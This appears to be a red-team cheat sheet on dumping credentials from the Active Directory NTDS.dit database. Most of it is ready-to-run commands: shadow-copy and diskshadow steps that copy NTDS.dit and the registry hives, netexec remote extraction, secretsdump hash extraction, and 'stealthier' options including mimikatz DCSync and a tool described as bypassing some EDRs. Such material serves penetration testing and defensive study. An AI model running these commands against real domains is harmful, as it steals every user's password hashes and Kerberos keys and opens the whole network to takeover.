---
title: "NTDS.DIT"
---

# 🔓 NTDS.dit

## 📚 Resources

- [ired.team](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration)
- [TheHackerRecipes](https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds)

## What is NTDS.dit

NTDS.dit is the Active Directory database. It contains all domain credentials (password hashes for all domain users), Kerberos keys, and AD objects.

## Local extraction

::: code-group

```cmd [vssadmin]
# Create shadow copy of C:
vssadmin create shadow /for=C:

# Copy NTDS.dit, SYSTEM, SAM, SECURITY (use shadow copy number 1)
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\SYSTEM
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\SAM
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\SECURITY
```

```powershell [UnderlayCopy]
# Import module and copy NTDS.dit without locking
Import-Module .\UnderlayCopy.ps1
Underlay-Copy -Mode MFT -SourceFile C:\Windows\NTDS\ntds.dit -DestinationFile C:\Temp\ntds.dit
```

```cmd [diskshadow]
# Create a script for diskshadow
echo set context persistent nowriters > script.txt
echo add volume c: alias ntdsShadow >> script.txt
echo create >> script.txt
echo expose %ntdsShadow% x: >> script.txt
echo exit >> script.txt

# Execute diskshadow
diskshadow /s script.txt

# Copy the files
xcopy x:\Windows\NTDS\ntds.dit C:\NTDS\
xcopy x:\Windows\System32\config\SYSTEM C:\
```

:::

## Remote extraction

```bash
# ntdsutil module
netexec smb $TARGET -u $USER -p $PASSWORD -M ntdsutil

# vss module
netexec smb $TARGET -u $USER -p $PASSWORD -M vss
```

## Extract hashes

```bash
secretsdump -ntds ntds.dit -system system -security security LOCAL
```


## Red Team alternatives (stealthier)

| Tool                     | Description                                      | Command                                           |
| ------------------------ | ------------------------------------------------ | ------------------------------------------------- |
| **DSInternals**          | PowerShell, bypasses some EDRs                   | `Get-ADDBAccount -DBPath ntds.dit -BootKey $key`  |
| **secretsdump** (remote) | No file transfer needed                          | `secretsdump -just-dc-ntlm domain/user@dc`        |
| **DCSync**               | Pull hashes via replication (no NTDS.dit needed) | `mimikatz # lsadump::dcsync /user:domain\\krbtgt` |

> For real red team: Prefer **DCSync** (if you have DA privileges) or **secretsdump remotely** over local NTDS.dit extraction.
